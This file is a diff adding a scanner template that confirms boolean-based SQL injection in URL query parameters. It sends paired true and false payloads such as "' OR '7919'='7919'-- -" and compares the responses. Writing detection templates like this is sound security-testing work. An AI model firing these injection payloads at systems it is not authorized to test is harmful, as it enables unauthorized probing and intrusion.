@@ -1,0 +1,114 @@
+id: ptflow-sqli-boolean-query
+
+info:
+  name: Boolean SQL Injection Differential Confirmation via Query Parameter
+  author: ptflow
+  severity: high
+  description: Confirms quoted or numeric boolean SQL injection from a query value with two stable true controls and one false control.
+  metadata:
+    max-request: 6
+    verified: true
+  tags: ptflow,dast,sqli,stable,fuzzing-req-query
+
+flow: (http(1) && http(2) && http(3)) || (http(4) && http(5) && http(6))
+
+http:
+  -
+    pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+
+    fuzzing:
+      - part: query
+        mode: single
+        type: postfix
+        fuzz:
+          - "' OR '7919'='7919'-- -"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code >= 200 && status_code < 400 && len(body) > 512'
+        internal: true
+
+  -
+    fuzzing:
+      - part: query
+        mode: single
+        type: postfix
+        fuzz:
+          - "' OR '7927'='7927'-- -"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'http_2_status_code == http_1_status_code'
+          - 'len(http_2_body) >= len(http_1_body) - 64 && len(http_2_body) <= len(http_1_body) + 64'
+        condition: and
+        internal: true
+
+  -
+    fuzzing:
+      - part: query
+        mode: single
+        type: postfix
+        fuzz:
+          - "' AND '7919'='7920'-- -"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'http_3_status_code == http_1_status_code'
+          - '(len(http_1_body) > len(http_3_body) && len(http_1_body) - len(http_3_body) >= 256 && (len(http_1_body) - len(http_3_body)) * 100 >= len(http_1_body) * 10) || (len(http_3_body) > len(http_1_body) && len(http_3_body) - len(http_1_body) >= 256 && (len(http_3_body) - len(http_1_body)) * 100 >= len(http_1_body) * 10)'
+        condition: and
+
+  -
+    pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+
+    fuzzing:
+      - part: query
+        mode: single
+        type: postfix
+        fuzz:
+          - ' AND 7919=7919'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code >= 200 && status_code < 400 && len(body) > 512'
+        internal: true
+
+  -
+    fuzzing:
+      - part: query
+        mode: single
+        type: postfix
+        fuzz:
+          - ' AND 7927=7927'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'http_5_status_code == http_4_status_code'
+          - 'len(http_5_body) >= len(http_4_body) - 64 && len(http_5_body) <= len(http_4_body) + 64'
+        condition: and
+        internal: true
+
+  -
+    fuzzing:
+      - part: query
+        mode: single
+        type: postfix
+        fuzz:
+          - ' AND 7919=7920'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'http_6_status_code == http_4_status_code'
+          - '(len(http_4_body) > len(http_6_body) && len(http_4_body) - len(http_6_body) >= 256 && (len(http_4_body) - len(http_6_body)) * 100 >= len(http_4_body) * 10) || (len(http_6_body) > len(http_4_body) && len(http_6_body) - len(http_4_body) >= 256 && (len(http_6_body) - len(http_4_body)) * 100 >= len(http_4_body) * 10)'
+        condition: and
